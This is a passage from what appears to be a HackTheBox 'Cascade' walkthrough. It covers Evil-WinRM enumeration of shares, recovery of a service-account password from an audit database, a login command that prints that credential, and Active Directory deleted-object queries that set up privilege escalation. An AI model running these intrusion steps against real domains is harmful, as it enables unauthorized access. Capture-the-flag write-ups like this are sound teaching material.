Mandatory Label<span class="se">\M</span>edium Plus Mandatory Level Label            S-1-16-8448


PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>
<p>Nothing much in this..</p>

<h3 id="proceding-with-dir-enumeration">Proceding with <code class="language-plaintext highlighter-rouge">Dir</code> enumeration.</h3>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>Shares
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>hares&gt; <span class="nb">cd </span>Audit
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\S</span>hares<span class="se">\A</span>udit&gt; <span class="nb">ls
    </span>Directory: C:<span class="se">\S</span>hares<span class="se">\A</span>udit
Mode                LastWriteTime         Length Name                                                           
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                     
d-----        1/28/2020   9:40 PM                DB                                                                                                                                                                                                      
d-----        1/26/2020  10:25 PM                x64                                                                                                                                                                                                     
d-----        1/26/2020  10:25 PM                x86                                                                                                                                                                                                     
<span class="nt">-a----</span>        1/28/2020   9:46 PM          13312 CascAudit.exe                                                                                                                                                                                           
<span class="nt">-a----</span>        1/29/2020   6:00 PM          12288 CascCrypto.dll                                                                                                                                                                                          
<span class="nt">-a----</span>        1/28/2020  11:29 PM             45 RunAudit.bat                                                                                                                                                                                            
<span class="nt">-a----</span>       10/27/2019   6:38 AM         363520 System.Data.SQLite.dll                                                                                                                                                                                  
<span class="nt">-a----</span>       10/27/2019   6:38 AM         186880 System.Data.SQLite.EF6.dll   
</code></pre></div></div>
<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">46</span> <span class="no">PM</span>          <span class="mi">13312</span> <span class="no">CascAudit</span><span class="p">.</span><span class="nf">exe</span>                                                                                                                                                                                           
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">1</span><span class="o">/</span><span class="mi">29</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">6</span><span class="p">:</span><span class="mo">00</span> <span class="no">PM</span>          <span class="mi">12288</span> <span class="no">CascCrypto</span><span class="p">.</span><span class="nf">dll</span>   
</code></pre></div></div>
<p>Found a couple of intresting files <code class="language-plaintext highlighter-rouge">exe</code> and <code class="language-plaintext highlighter-rouge">dll</code>.</p>

<p>There was a folder <code class="language-plaintext highlighter-rouge">DB</code> and which contains <code class="language-plaintext highlighter-rouge">Audit.db</code>..</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Shares</span><span class="p">\</span><span class="no">Audit</span><span class="p">\</span><span class="no">DB</span><span class="o">&gt;</span> <span class="n">ls</span>


    <span class="no">Directory</span><span class="p">:</span> <span class="no">C</span><span class="p">:\</span><span class="no">Shares</span><span class="p">\</span><span class="no">Audit</span><span class="p">\</span><span class="no">DB</span>


<span class="no">Mode</span>                <span class="no">LastWriteTime</span>         <span class="no">Length</span> <span class="no">Name</span>                                                                                                                                                                                                    
<span class="o">----</span>                <span class="o">-------------</span>         <span class="o">------</span> <span class="o">----</span>                                                                                                                                                                                                    
<span class="o">-</span><span class="n">a</span><span class="o">----</span>        <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span>   <span class="mi">9</span><span class="p">:</span><span class="mi">39</span> <span class="no">PM</span>          <span class="mi">24576</span> <span class="no">Audit</span><span class="p">.</span><span class="nf">db</span> 
</code></pre></div></div>
<p>Downloaded the <code class="language-plaintext highlighter-rouge">Audit.db</code> file and looking in the contents I found <code class="language-plaintext highlighter-rouge">ArkSvcBQO5l5Kj9MdErXx6Q6AGOw==</code></p>

<p>Having a look at both the other files that we have got <code class="language-plaintext highlighter-rouge">CascAudit.exe</code> and <code class="language-plaintext highlighter-rouge">CascCrypto.dll</code> using <code class="language-plaintext highlighter-rouge">DNSPY</code>.</p>

<p><img src="/assets/img/sample/cascade/cascade3.png" alt="" /></p>

<p><img src="/assets/img/sample/cascade/cascade1.png" alt="" /></p>

<p><img src="/assets/img/sample/cascade/cascade2.png" alt="" /></p>

<p>After all the <code class="language-plaintext highlighter-rouge">REverse Engineering</code> is done, the final output is the password of user <code class="language-plaintext highlighter-rouge">ARK-SVC</code></p>

<h2 id="login-as-arksvc">Login as <code class="language-plaintext highlighter-rouge">Arksvc</code></h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span> <span class="o">-</span><span class="n">i</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">htb</span> <span class="o">-</span><span class="n">u</span> <span class="n">arksvc</span> <span class="o">-</span><span class="nb">p</span> <span class="n">w3lc0meFr31nd</span>

<span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span> <span class="n">shell</span> <span class="n">v2</span><span class="o">.</span><span class="mi">0</span>

<span class="no">Info</span><span class="p">:</span> <span class="no">Establishing</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">remote</span> <span class="n">endpoint</span>

<span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">arksvc</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span>
</code></pre></div></div>

<h2 id="privilege-escalation-part-2">Privilege escalation <code class="language-plaintext highlighter-rouge">part 2</code></h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">arksvc</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="n">whoami</span> <span class="sr">/all

USER INFORMATION
----------------

User Name      SID                                           
============== ==============================================
cascade\arksvc S-1-5-21-3332504370-1206983947-1165150453-1106


GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                            Attributes                                                     
=========================================== ================ ============================================== ===============================================================
Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group             
BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group             
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group             
CASCADE\Data Share                          Alias            S-1-5-21-3332504370-1206983947-1165150453-1138 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\IT                                  Alias            S-1-5-21-3332504370-1206983947-1165150453-1113 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group
CASCADE\Remote Management Users             Alias            S-1-5-21-3332504370-1206983947-1165150453-1126 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group             
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State  
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
</span></code></pre></div></div>
<p>This thing seems very instresting!!</p>

<p><code class="language-plaintext highlighter-rouge">CASCADE\AD Recycle Bin                      Alias            S-1-5-21-3332504370-1206983947-1165150453-1119 Mandatory group, Enabled by default, Enabled group, Local Group</code></p>

<h2 id="finding-the-deleted-objects">Finding the Deleted Objects:</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\a</span>rksvc<span class="se">\D</span>ocuments&gt; Get-ADObject <span class="nt">-ldapFilter</span>:<span class="s2">"(msDS-LastKnownRDN=*)"</span> <span class="nt">-IncludeDeletedObjects</span>



Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>CASC-WS1<span class="se">\0</span>ADEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : CASC-WS1
                    DEL:6d97daa4-2e82-4946-a11e-f91fa18bfabe
ObjectClass       : computer
ObjectGUID        : 6d97daa4-2e82-4946-a11e-f91fa18bfabe

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Scheduled Tasks<span class="se">\0</span>ADEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Scheduled Tasks
                    DEL:13375728-5ddb-4137-b8b8-b9041d1d3fd2
ObjectClass       : group
ObjectGUID        : 13375728-5ddb-4137-b8b8-b9041d1d3fd2

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">={</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span><span class="se">\0</span>ADEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : <span class="o">{</span>A403B701-A528-4685-A816-FDEE32BDDCBA<span class="o">}</span>
                    DEL:ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e
ObjectClass       : groupPolicyContainer
ObjectGUID        : ff5c2fdc-cc11-44e3-ae4c-071aab2ccc6e

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>Machine<span class="se">\0</span>ADEL:93c23674-e411-400b-bb9f-c0340bda5a34,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : Machine
                    DEL:93c23674-e411-400b-bb9f-c0340bda5a34
ObjectClass       : container
ObjectGUID        : 93c23674-e411-400b-bb9f-c0340bda5a34

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>User<span class="se">\0</span>ADEL:746385f2-e3a0-4252-b83a-5a206da0ed88,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : User
                    DEL:746385f2-e3a0-4252-b83a-5a206da0ed88
ObjectClass       : container
ObjectGUID        : 746385f2-e3a0-4252-b83a-5a206da0ed88

Deleted           : True
DistinguishedName : <span class="nv">CN</span><span class="o">=</span>TempAdmin<span class="se">\0</span>ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN<span class="o">=</span>Deleted Objects,DC<span class="o">=</span>cascade,DC<span class="o">=</span><span class="nb">local
</span>Name              : TempAdmin
                    DEL:f0cc344d-31e0-4866-bceb-a842791ca059
ObjectClass       : user
ObjectGUID        : f0cc344d-31e0-4866-bceb-a842791ca059

</code></pre></div></div>

<p>The below ones are intresting!</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">Deleted</span>           <span class="p">:</span> <span class="no">True</span>
<span class="no">DistinguishedName</span> <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">TempAdmin</span><span class="p">\</span><span class="mi">0</span><span class="no">ADEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="no">Name</span>              <span class="p">:</span> <span class="no">TempAdmin</span>
                    <span class="no">DEL</span><span class="ss">:f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
<span class="no">ObjectClass</span>       <span class="p">:</span> <span class="n">user</span>
<span class="no">ObjectGUID</span>        <span class="p">:</span> <span class="n">f0cc344d</span><span class="o">-</span><span class="mf">31e0</span><span class="o">-</span><span class="mi">4866</span><span class="o">-</span><span class="n">bceb</span><span class="o">-</span><span class="n">a842791ca059</span>
</code></pre></div></div>
<h3 id="gaining-root-access">Gaining ROOT Access!!</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="no">Evil</span><span class="o">-</span><span class="no">WinRM</span><span class="o">*</span> <span class="no">PS</span> <span class="no">C</span><span class="p">:\</span><span class="no">Users</span><span class="p">\</span><span class="n">arksvc</span><span class="p">\</span><span class="no">Documents</span><span class="o">&gt;</span> <span class="no">Get</span><span class="o">-</span><span class="no">ADObject</span> <span class="o">-</span><span class="n">filter</span> <span class="s1">'isdeleted -eq $true -and name -ne "Deleted Objects"'</span> <span class="o">-</span><span class="n">includeDeletedObjects</span> <span class="o">-</span><span class="n">property</span> <span class="o">*</span>


<span class="n">accountExpires</span>                  <span class="p">:</span> <span class="mi">9223372036854775807</span>
<span class="n">badPasswordTime</span>                 <span class="p">:</span> <span class="mi">0</span>
<span class="n">badPwdCount</span>                     <span class="p">:</span> <span class="mi">0</span>
<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">6</span><span class="n">d97daa4</span><span class="o">-</span><span class="mf">2e82</span><span class="o">-</span><span class="mi">4946</span><span class="o">-</span><span class="n">a11e</span><span class="o">-</span><span class="n">f91fa18bfabe</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">6</span><span class="n">d97daa4</span><span class="o">-</span><span class="mf">2e82</span><span class="o">-</span><span class="mi">4946</span><span class="o">-</span><span class="n">a11e</span><span class="o">-</span><span class="n">f91fa18bfabe</span>
<span class="n">codePage</span>                        <span class="p">:</span> <span class="mi">0</span>
<span class="n">countryCode</span>                     <span class="p">:</span> <span class="mi">0</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">7</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">19</span> <span class="no">PM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">7</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">19</span> <span class="no">PM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span><span class="p">\</span><span class="mi">0</span><span class="no">ADEL</span><span class="p">:</span><span class="mi">6</span><span class="n">d97daa4</span><span class="o">-</span><span class="mf">2e82</span><span class="o">-</span><span class="mi">4946</span><span class="o">-</span><span class="n">a11e</span><span class="o">-</span><span class="n">f91fa18bfabe</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">36</span> <span class="no">AM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">12</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mo">04</span> <span class="no">AM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">7</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">19</span> <span class="no">PM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="o">/</span><span class="mi">1601</span> <span class="mi">12</span><span class="p">:</span><span class="mo">04</span><span class="p">:</span><span class="mi">17</span> <span class="no">AM</span><span class="p">}</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isCriticalSystemObject</span>          <span class="p">:</span> <span class="no">False</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">OU</span><span class="o">=</span><span class="no">Computers</span><span class="p">,</span><span class="no">OU</span><span class="o">=</span><span class="no">UK</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">lastLogoff</span>                      <span class="p">:</span> <span class="mi">0</span>
<span class="n">lastLogon</span>                       <span class="p">:</span> <span class="mi">0</span>
<span class="n">localPolicyFlags</span>                <span class="p">:</span> <span class="mi">0</span>
<span class="n">logonCount</span>                      <span class="p">:</span> <span class="mi">0</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">35</span> <span class="no">PM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">35</span> <span class="no">PM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">6</span><span class="n">d97daa4</span><span class="o">-</span><span class="mf">2e82</span><span class="o">-</span><span class="mi">4946</span><span class="o">-</span><span class="n">a11e</span><span class="o">-</span><span class="n">f91fa18bfabe</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">computer</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="mi">6</span><span class="n">d97daa4</span><span class="o">-</span><span class="mf">2e82</span><span class="o">-</span><span class="mi">4946</span><span class="o">-</span><span class="n">a11e</span><span class="o">-</span><span class="n">f91fa18bfabe</span>
<span class="n">objectSid</span>                       <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3332504370</span><span class="o">-</span><span class="mi">1206983947</span><span class="o">-</span><span class="mi">1165150453</span><span class="o">-</span><span class="mi">1108</span>
<span class="n">primaryGroupID</span>                  <span class="p">:</span> <span class="mi">515</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">pwdLastSet</span>                      <span class="p">:</span> <span class="mi">132230718192147073</span>
<span class="n">sAMAccountName</span>                  <span class="p">:</span> <span class="no">CASC</span><span class="o">-</span><span class="no">WS1</span><span class="err">$</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">userAccountControl</span>              <span class="p">:</span> <span class="mi">4128</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">245849</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">24603</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mi">08</span><span class="p">:</span><span class="mi">35</span> <span class="no">PM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">9</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">7</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">19</span> <span class="no">PM</span>

<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="no">Scheduled</span> <span class="no">Tasks</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">13375728</span><span class="o">-</span><span class="mi">5</span><span class="n">ddb</span><span class="o">-</span><span class="mi">4137</span><span class="o">-</span><span class="n">b8b8</span><span class="o">-</span><span class="n">b9041d1d3fd2</span>
<span class="no">CN</span>                              <span class="p">:</span> <span class="no">Scheduled</span> <span class="no">Tasks</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">13375728</span><span class="o">-</span><span class="mi">5</span><span class="n">ddb</span><span class="o">-</span><span class="mi">4137</span><span class="o">-</span><span class="n">b8b8</span><span class="o">-</span><span class="n">b9041d1d3fd2</span>
<span class="no">Created</span>                         <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">5</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">53</span> <span class="no">PM</span>
<span class="n">createTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">5</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">53</span> <span class="no">PM</span>
<span class="no">Deleted</span>                         <span class="p">:</span> <span class="no">True</span>
<span class="no">Description</span>                     <span class="p">:</span>
<span class="no">DisplayName</span>                     <span class="p">:</span>
<span class="no">DistinguishedName</span>               <span class="p">:</span> <span class="no">CN</span><span class="o">=</span><span class="no">Scheduled</span> <span class="no">Tasks</span><span class="p">\</span><span class="mi">0</span><span class="no">ADEL</span><span class="p">:</span><span class="mi">13375728</span><span class="o">-</span><span class="mi">5</span><span class="n">ddb</span><span class="o">-</span><span class="mi">4137</span><span class="o">-</span><span class="n">b8b8</span><span class="o">-</span><span class="n">b9041d1d3fd2</span><span class="p">,</span><span class="no">CN</span><span class="o">=</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="n">dSCorePropagationData</span>           <span class="p">:</span> <span class="p">{</span><span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">9</span><span class="p">:</span><span class="mi">35</span><span class="p">:</span><span class="mi">46</span> <span class="no">PM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">9</span><span class="p">:</span><span class="mi">32</span><span class="p">:</span><span class="mi">57</span> <span class="no">PM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">3</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">36</span> <span class="no">AM</span><span class="p">,</span> <span class="mi">1</span><span class="o">/</span><span class="mi">17</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">12</span><span class="p">:</span><span class="mi">14</span><span class="p">:</span><span class="mo">04</span> <span class="no">AM</span><span class="o">...</span><span class="p">}</span>
<span class="n">groupType</span>                       <span class="p">:</span> <span class="o">-</span><span class="mi">2147483644</span>
<span class="n">instanceType</span>                    <span class="p">:</span> <span class="mi">4</span>
<span class="n">isDeleted</span>                       <span class="p">:</span> <span class="no">True</span>
<span class="no">LastKnownParent</span>                 <span class="p">:</span> <span class="no">OU</span><span class="o">=</span><span class="no">Groups</span><span class="p">,</span><span class="no">OU</span><span class="o">=</span><span class="no">UK</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">cascade</span><span class="p">,</span><span class="no">DC</span><span class="o">=</span><span class="n">local</span>
<span class="no">Modified</span>                        <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">55</span> <span class="no">PM</span>
<span class="n">modifyTimeStamp</span>                 <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">55</span> <span class="no">PM</span>
<span class="n">msDS</span><span class="o">-</span><span class="no">LastKnownRDN</span>               <span class="p">:</span> <span class="no">Scheduled</span> <span class="no">Tasks</span>
<span class="no">Name</span>                            <span class="p">:</span> <span class="no">Scheduled</span> <span class="no">Tasks</span>
                                  <span class="no">DEL</span><span class="p">:</span><span class="mi">13375728</span><span class="o">-</span><span class="mi">5</span><span class="n">ddb</span><span class="o">-</span><span class="mi">4137</span><span class="o">-</span><span class="n">b8b8</span><span class="o">-</span><span class="n">b9041d1d3fd2</span>
<span class="n">nTSecurityDescriptor</span>            <span class="p">:</span> <span class="no">System</span><span class="o">.</span><span class="no">DirectoryServices</span><span class="o">.</span><span class="no">ActiveDirectorySecurity</span>
<span class="no">ObjectCategory</span>                  <span class="p">:</span>
<span class="no">ObjectClass</span>                     <span class="p">:</span> <span class="n">group</span>
<span class="no">ObjectGUID</span>                      <span class="p">:</span> <span class="mi">13375728</span><span class="o">-</span><span class="mi">5</span><span class="n">ddb</span><span class="o">-</span><span class="mi">4137</span><span class="o">-</span><span class="n">b8b8</span><span class="o">-</span><span class="n">b9041d1d3fd2</span>
<span class="n">objectSid</span>                       <span class="p">:</span> <span class="no">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">3332504370</span><span class="o">-</span><span class="mi">1206983947</span><span class="o">-</span><span class="mi">1165150453</span><span class="o">-</span><span class="mi">1131</span>
<span class="no">ProtectedFromAccidentalDeletion</span> <span class="p">:</span> <span class="no">False</span>
<span class="n">sAMAccountName</span>                  <span class="p">:</span> <span class="no">Scheduled</span> <span class="no">Tasks</span>
<span class="n">sDRightsEffective</span>               <span class="p">:</span> <span class="mi">0</span>
<span class="n">uSNChanged</span>                      <span class="p">:</span> <span class="mi">245848</span>
<span class="n">uSNCreated</span>                      <span class="p">:</span> <span class="mi">114790</span>
<span class="n">whenChanged</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">28</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">6</span><span class="p">:</span><span class="mo">07</span><span class="p">:</span><span class="mi">55</span> <span class="no">PM</span>
<span class="n">whenCreated</span>                     <span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="mi">2020</span> <span class="mi">5</span><span class="p">:</span><span class="mi">21</span><span class="p">:</span><span class="mi">53</span> <span class="no">PM</span>

<span class="no">CanonicalName</span>                   <span class="p">:</span> <span class="n">cascade</span><span class="p">.</span><span class="nf">local</span><span class="o">/</span><span class="no">Deleted</span> <span class="no">Objects</span><span class="o">/</span><span class="p">{</span><span class="no">A403B701</span><span class="o">-</span><span class="no">A528</span><span class="o">-</span><span class="mi">4685</span><span class="o">-</span><span class="no">A816</span><span class="o">-</span><span class="no">FDEE32BDDCBA</span><span class="p">}</span>
